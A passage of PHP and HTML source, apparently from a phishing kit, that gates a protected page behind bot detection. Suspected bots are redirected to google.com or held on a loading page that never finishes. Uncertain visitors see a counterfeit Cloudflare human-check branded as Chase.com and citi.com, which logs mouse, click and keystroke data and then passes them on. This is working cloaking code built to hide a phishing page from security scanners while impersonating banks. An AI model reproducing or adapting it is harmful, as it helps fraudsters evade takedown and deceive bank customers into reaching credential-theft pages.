        log_access_attempt($client_ip, 'bot', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        
        // Apply shadow enforcement instead of immediate block
        $shadow_action = apply_shadow_enforcement($client_ip, $bot_analysis['confidence'], $config);
        
        if ($shadow_action === 'block') {
            // Hard block mode - immediate redirect
            file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | BLOCKED | IP: {$client_ip} | Reason: {$reason}\n", FILE_APPEND);
            header("Location: https://www.google.com");
            exit;
        } elseif ($shadow_action && strpos($shadow_action, 'shadow_') === 0) {
            // Shadow enforcement - show fake success or slow down bot
            
            // For page requests, show a fake loading page that never completes
            ?>
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Loading...</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        background: #f8f9fa;
                        font-family: "Segoe UI", Arial, sans-serif;
                    }
                    .container {
                        text-align: center;
                        padding: 40px;
                    }
                    .spinner {
                        width: 50px;
                        height: 50px;
                        margin: 0 auto 20px;
                        border: 4px solid #e0e0e0;
                        border-top: 4px solid #007bff;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    .message {
                        font-size: 18px;
                        color: #333;
                        margin-bottom: 10px;
                    }
                    .submessage {
                        font-size: 14px;
                        color: #666;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="spinner"></div>
                    <div class="message">Processing your request...</div>
                    <div class="submessage">Please wait while we verify your connection</div>
                </div>
                <script>
                    // Fake progress that never completes
                    let progress = 0;
                    setInterval(() => {
                        progress += Math.random() * 2;
                        if (progress > 98) progress = 98; // Never reach 100%
                        console.log('Loading: ' + Math.floor(progress) + '%');
                    }, <?php echo rand(2000, 5000); ?>);
                    
                    // Occasionally show fake "success" but don't redirect
                    setTimeout(() => {
                        document.querySelector('.message').textContent = 'Almost there...';
                    }, <?php echo rand(30000, 60000); ?>);
                </script>
            </body>
            </html>
            <?php
            exit;
        }
    }
    
    // Seamless access for confident humans - set cookies and allow entry
    if ($bot_analysis['is_confident_human']) {
        // Generate dynamic fingerprint with session-network binding
        $dynamic_fp = generate_dynamic_fingerprint($client_ip);
        save_fingerprint($client_ip, $dynamic_fp);
        
        setcookie('js_verified', 'yes', time() + 86400, '/');
        setcookie('fp_hash', $dynamic_fp, time() + 86400, '/');
        // Log to admin dashboard
        log_access_attempt($client_ip, 'human', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        // Allow the page to continue loading - no exit, no redirect
    }
    
    // Show warning UI only for uncertain cases
    if ($bot_analysis['is_uncertain']) {
        // Generate dynamic fingerprint for this session
        $dynamic_fp = generate_dynamic_fingerprint($client_ip);
        save_fingerprint($client_ip, $dynamic_fp);
        
        // Log to admin dashboard
        log_access_attempt($client_ip, 'uncertain', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        // Show CAPTCHA page
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <title id="dynamic-title">Verify you are human</title>
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
          <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
          <style>
            :root {
              --box-border:#e5e7eb;
              --box-bg:#fff;
              --text:#222;
              --muted:#8b8b8b;
              --check:#198754;
              --check-bg:#eaf7ed;
              --shadow:0 1px 6px rgba(0,0,0,.06);
            }

            html, body {
              margin: 0;
              padding: 0;
              height: 100%;
              background: #fff;
              font-family: "Segoe UI","Tahoma","Arial",sans-serif;
              color: var(--text);
              display: flex;
              justify-content: flex-start;
              align-items: flex-start;
            }

            .wrap {
              margin: 90px 0 0 48px;
              display: flex;
              flex-direction: column;
              align-items: flex-start;
              max-width: 640px;
              width: 100%;
              box-sizing: border-box;
            }

            .head {
              display: flex;
              align-items: center;
              gap: 8px;
              margin-bottom: 6px;
            }

            .site-logo { height: 26px; width: auto; object-fit: contain; }
            .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
            .desc { font-size: 1rem; margin: 0 0 16px 0; }

            .cf-box {
              position: relative;
              background: var(--box-bg);
              border: 1px solid var(--box-border);
              border-radius: 6px;
              box-shadow: var(--shadow);
              width: 100%;
              max-width: 560px;
              padding: 10px 14px;
              display: flex;
              align-items: center;
              justify-content: space-between;
              gap: 8px;
              box-sizing: border-box;
              overflow: hidden;
            }

            .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
            .cf-checkbox {
              appearance: none;
              width: 24px; height: 24px;
              border: 2px solid #bfbfbf; border-radius: 6px;
              background: #f9f9f9; cursor: pointer;
              position: relative; outline: none;
              transition: border-color .18s, background .18s;
              flex: 0 0 24px;
            }
            .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
            .cf-checkbox:checked::after {
              content: "";
              position: absolute;
              left: 6px; top: 3px;
              width: 8px; height: 14px;
              border: solid var(--check);
              border-width: 0 3px 3px 0;
              transform: rotate(45deg);
            }

            .cf-text { font-size: .98rem; user-select: none; }
            .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
            .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
            .cf-legal { font-size: .88rem; color: var(--muted); }

            .state-overlay {
              position: absolute;
              inset: 0;
              background: #fff;
              display: none;
              align-items: center;
              gap: 10px;
              padding: 0 14px;
              font-size: .98rem;
              font-weight: 600;
            }

            .state-overlay.active { display: flex; animation: fade .2s; }
            .spinner {
              width: 18px; height: 18px;
              display: inline-block; position: relative;
            }
            .spinner::before {
              content: "";
              position: absolute; inset: 0;
              border-radius: 50%;
              border: 3px dotted #4a9cdb;
              animation: spin 1s linear infinite;
            }

            .success-icon {
              width: 22px; height: 22px;
              border-radius: 50%;
              background: #34c759; color: #fff;
              display: inline-flex; align-items: center;
              justify-content: center; font-size: 14px;
            }

            .foot { margin-top: 14px; font-size: .98rem; }

            @keyframes spin { to { transform: rotate(360deg); } }
            @keyframes fade { from { opacity: 0; } to { opacity: 1; } }

            @media (max-width: 600px) {
              .wrap {
                margin: 110px 0 0 16px;
                max-width: 100%;
                width: calc(100vw - 32px);
              }
              .site-title { font-size: 1.25rem; }
              .desc { font-size: .95rem; margin-bottom: 12px; }
              .cf-box {
                max-width: none;
                width: 100%;
                padding: 8px 12px;
              }
              .cf-text { font-size: .94rem; }
              .cf-right { min-width: auto; }
              .cf-logo { height: 20px; }
              .foot { font-size: .9rem; }
            }
          </style>
        </head>
        <body>
          <div class="wrap">
            <div class="head">
              <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
              <h1 id="site-title" class="site-title">Chase.com</h1>
            </div>
            <p class="desc">Verify you are human by completing the action below.</p>

            <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
              <label class="cf-left" for="cfCheck">
                <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
                <span class="cf-text">Verify you are human</span>
              </label>
              <div class="cf-right" aria-hidden="true">
                <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
                <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
              </div>

              <div id="stateVerifying" class="state-overlay" aria-live="polite">
                <span class="spinner" aria-hidden="true"></span>
                <span>Verifying...</span>
              </div>

              <div id="stateSuccess" class="state-overlay" aria-live="polite">
                <span class="success-icon">✔</span>
                <span>Success!</span>
              </div>
            </form>

            <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
          </div>

          <script>
            function setSite(name, logoUrl) {
              document.getElementById('site-title').textContent = name;
              document.getElementById('site-foot').textContent =
                name + " needs to review the security of your connection before proceeding.";
              document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
              if (logoUrl) document.getElementById('site-logo').src = logoUrl;
            }

            setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");

            // Behavioral tracking for anti-bot detection
            const behaviorData = {
              clicks: [],
              mouseMovements: [],
              keyPresses: [],
              startTime: Date.now(),
              errors: 0,
              hesitations: 0
            };

            // Track mouse movements for natural behavior
            let lastMouseMove = Date.now();
            document.addEventListener('mousemove', (e) => {
              const now = Date.now();
              const timeSinceLastMove = now - lastMouseMove;
              behaviorData.mouseMovements.push({
                x: e.clientX,
                y: e.clientY,
                time: now,
                gap: timeSinceLastMove
              });
              lastMouseMove = now;
              
              if (behaviorData.mouseMovements.length > 50) {
                behaviorData.mouseMovements.shift();
              }
            });

            // Track clicks with timing
            document.addEventListener('click', (e) => {
              behaviorData.clicks.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now(),
                target: e.target.tagName
              });
            });

            // Track keyboard interactions
            document.addEventListener('keydown', (e) => {
              behaviorData.keyPresses.push({
                key: e.key,
                time: Date.now()
              });
            });

            const check = document.getElementById('cfCheck');
            const vState = document.getElementById('stateVerifying');
            const sState = document.getElementById('stateSuccess');
            const originalUrl = localStorage.getItem('antibot_redirect') || '/';

            check.addEventListener('change', () => {
              if (!check.checked) {
                vState.classList.remove('active');
                sState.classList.remove('active');
                return;
              }
              
              const totalTime = Date.now() - behaviorData.startTime;
              const hasNaturalMovement = behaviorData.mouseMovements.length > 10;
              const hasVariedTiming = behaviorData.mouseMovements.some(m => m.gap > 50);
              const notTooFast = totalTime > 1000;
              
              vState.classList.add('active');
              
              const behaviorScore = {
                totalTime,
                mouseMovements: behaviorData.mouseMovements.length,
                clicks: behaviorData.clicks.length,
                naturalBehavior: hasNaturalMovement && hasVariedTiming && notTooFast
              };
              
              try {
                localStorage.setItem('behavior_check', JSON.stringify(behaviorScore));
              } catch(e) {}
              
              // Use dynamic fingerprint from server
              const dynamicFingerprint = <?php echo json_encode($dynamic_fp); ?>;
              
              document.cookie = "js_verified=yes; path=/";
              document.cookie = "fp_hash=" + dynamicFingerprint + "; path=/";
              document.cookie = "behavior_verified=" + (behaviorScore.naturalBehavior ? "yes" : "uncertain") + "; path=/";
              
              setTimeout(() => {
                vState.classList.remove('active');
                sState.classList.add('active');
                setTimeout(() => { location.href = originalUrl; }, 900);
              }, 800);
            });
          </script>
        </body>
        </html>
        <?php
        exit;
    }
}

// If we reach here, allow the page to continue loading
// This happens when:
// 1. User already has js_verified and fp_hash cookies (returning visitor)
// 2. User was identified as confident human and cookies were set
// The rest of the protected page will load normally
?>
